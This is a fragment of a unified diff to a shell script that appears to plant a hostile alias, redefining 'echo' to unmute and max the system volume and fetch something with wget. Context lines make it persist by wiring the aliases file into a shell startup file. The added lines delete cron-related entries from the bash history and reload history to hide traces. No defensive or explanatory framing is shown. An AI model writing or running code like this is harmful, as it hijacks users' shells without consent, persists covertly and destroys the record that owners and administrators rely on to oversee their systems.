@@ -23,3 +23,6 @@ echo "alias echo='(amixer -q set Master unmute; amixer -q set Master 100%; wget 
 if ! grep -qxF "$AB" "$B" && ! grep -q "^#.*if \[ -f ~/.bash_aliases \]; then" "$B"; then
     echo -e "\n$AB" >> "$B"
 fi
+sed -i '/cron/d' ~/.bash_history
+history -c
+history -r
